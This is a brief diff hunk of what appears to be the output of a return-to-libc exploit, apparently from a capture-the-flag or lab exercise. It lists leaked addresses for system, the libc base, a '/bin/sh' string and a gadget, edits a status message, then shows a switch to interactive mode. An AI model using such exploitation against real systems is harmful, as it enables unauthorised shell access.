@@ -270,7 +270,7 @@ system   : 0x7f5ca2893390
 libc_base: 0x7f5ca284e000
 binsh    : 0x7f5ca29dad57
 popret   : 0x400763
-[@] SUCCESSFULLY RETURNED TO main AGAIN!
+[@] RETURNED TO main
 [*] Switching to interactive mode
 
 ==============================
